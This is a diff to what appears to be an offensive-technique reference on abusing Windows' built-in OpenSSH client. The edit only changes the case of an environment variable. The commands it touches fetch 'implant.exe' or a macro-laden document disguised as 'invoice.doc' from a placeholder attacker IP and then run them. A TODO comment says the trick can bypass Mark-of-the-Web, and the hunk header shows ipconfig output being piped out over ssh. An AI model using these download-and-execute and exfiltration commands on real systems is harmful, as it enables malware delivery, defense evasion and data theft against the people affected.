@@ -42,13 +42,13 @@ ipconfig /all | %SYSTEMDIRECTORY%\OpenSSH\ssh.exe [-p <PORT>] "cat - > %COMPUTER
 Transfer file to the system.
 
 ```
-C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -o "StrictHostKeyChecking=no PermitLocalCommand=yes" -o "LocalCommand=scp [-P <PORT>] <username>@<attacker_IP>:implant.exe %AppData%\Microsoft\Templates\implant.exe\. && %AppData%\Microsoft\Templates\implant.exe" <username>@<attacker_IP>
+C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -o "StrictHostKeyChecking=no PermitLocalCommand=yes" -o "LocalCommand=scp [-P <PORT>] <username>@<attacker_IP>:implant.exe %AppData%\Microsoft\Templates\implant.exe\. && %APPDATA%\Microsoft\Templates\implant.exe" <username>@<attacker_IP>
 ```
 
 TODO: This can be used to transfer embedded macro document to bypass MOTW.
 
 ```
-C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -o "StrictHostKeyChecking=no PermitLocalCommand=yes" -o "LocalCommand=scp [-P <PORT>] <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\invoice.doc\. && %AppData%\Microsoft\Templates\invoice.doc" <username>@<attacker_IP>
+C:\Windows\System32\OpenSSH\ssh.exe [-p <PORT>] -o "StrictHostKeyChecking=no PermitLocalCommand=yes" -o "LocalCommand=scp [-P <PORT>] <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\invoice.doc\. && %APPDATA%\Microsoft\Templates\invoice.doc" <username>@<attacker_IP>
 ```
 
 ### SMB Relay
